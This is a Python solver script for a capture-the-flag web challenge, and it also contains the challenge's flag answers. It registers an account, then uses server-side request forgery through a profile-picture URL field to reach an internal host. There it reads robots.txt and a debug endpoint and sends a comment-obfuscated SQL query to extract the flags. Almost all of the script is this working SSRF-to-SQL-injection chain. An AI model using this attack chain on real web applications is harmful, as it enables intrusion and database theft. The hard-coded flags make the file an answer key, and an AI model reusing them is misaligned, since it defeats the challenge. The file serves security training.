#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import uuid
import os
import time
import pathlib
import re
import base64

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHALLENGE_HOST = os.getenv("CHALLENGE_HOST", "http://web3.notmonitoringyourinternettraffic.ns.agency")

FLAG1 = "flag{this_isnt_a_flag_but_youre_making_progress}"
FLAG2 = "flag{flag_this_isnt_a_flag_but_youre_making_progress2}"
FLAG3 = "FLAG{jdusNrj8Fm8jnW84zcWZS9IJUqp7X2OgFIaZMrVID2ArAXXvp_EgLlE4RXu38mIogMijb_3gwAY}"

GOOD_STATUS_CODES = [200, 302, 301]


def check_page(s, host, data, content, headers=None):
    r = s.post(host, data=data, verify=False, headers=headers)
    if r.status_code not in GOOD_STATUS_CODES:
        print("initial ssrf bad status code: ", r.status_code)
        print(r.text)
        return False

    base64content = re.findall("base64,(.*?)\"", r.text)
    if not base64content:
        print("Unable to find image content on page")
        print(r.text)
        return False

    try:
        data = base64.b64decode(base64content[0]).decode("utf-8")
    except:
        print("Unable to utf-8 decode base64 content")
        return False

    if content not in data:
        print(r.text)
        print("failed find ", content)
        return False

    return True


def main():
    s = requests.Session()

    # Get the right IP Address
    r = s.get(CHALLENGE_HOST, verify=False)
    GOOD_STATUS_CODES = [200, 302, 301]
    if r.status_code not in GOOD_STATUS_CODES:
        print("getting ip_range bad status code: ", r.status_code)
        print(r.text)
        exit(-1)
    my_ip = r.headers['X-Server']
    prefix = '.'.join(my_ip.split('.')[0:-1])
    suffix = my_ip.split('.')[-1]
    their_suffix = '2'

    if suffix == '2':
        their_suffix = '4'
    if suffix == '3':
        their_suffix = '4'
    if suffix == '4':
        their_suffix = '3'

    assert (r.headers['FLAG'] == FLAG1)

    # register for an account
    USERNAME = str(uuid.uuid4())
    PASSWORD = "lol"
    REGISTER_ENDPOINT = 'register'
    r = s.post(
        CHALLENGE_HOST + '/' + REGISTER_ENDPOINT,
        data={
            "username": USERNAME,
            "password": PASSWORD
        },
        verify=False)
    if r.status_code not in GOOD_STATUS_CODES:
        print("registering bad status code: ", r.status_code)
        print(r.text)
        exit(-1)

    LOGIN_ENDPOINT = 'login'
    r = s.post(
        CHALLENGE_HOST + '/' + LOGIN_ENDPOINT,
        data={
            "username": USERNAME,
            "password": PASSWORD
        },
        verify=False)
    if r.status_code not in GOOD_STATUS_CODES:
        print("logging in bad status code: ", r.status_code)
        print(r.text)
        exit(-1)

    SSRF_ENDPOINT = 'profile'
    their_ip = 'http://{}.{}'.format(prefix, their_suffix)
    print("checking their ip: ", their_ip)
    #check that the initial ssrf works
    if not check_page(s, CHALLENGE_HOST + '/' + SSRF_ENDPOINT,
                      {"profile_picture_url": their_ip},
                      "beep boop. maybe there's nothing here?"):
        exit(-1)

    # check that robots.txt works
    if not check_page(s, CHALLENGE_HOST + '/' + SSRF_ENDPOINT,
                      {"profile_picture_url": their_ip + "/robots.txt"},
                      "/db-debug"):
        exit(-1)

    # check that flag2 is present
    if not check_page(s, CHALLENGE_HOST + '/' + SSRF_ENDPOINT,
                      {"profile_picture_url": their_ip + "/robots.txt"},
                      FLAG2):
        exit(-1)

    # check that the ssrf page exists;
    if not check_page(s, CHALLENGE_HOST + '/' + SSRF_ENDPOINT,
                      {"profile_picture_url": their_ip + "/db-debug"},
                      "data:"):
        exit(-1)

    # check if the sqli works;
    unique_str = str(uuid.uuid4())
    payload = "query=select/**/*/**/from/**/appuser"
    if not check_page(
            s, CHALLENGE_HOST + '/' + SSRF_ENDPOINT,
        {"profile_picture_url": their_ip + "/db-debug" + "?" + payload},
            FLAG3):
        exit(-1)


if __name__ == "__main__":
    main()
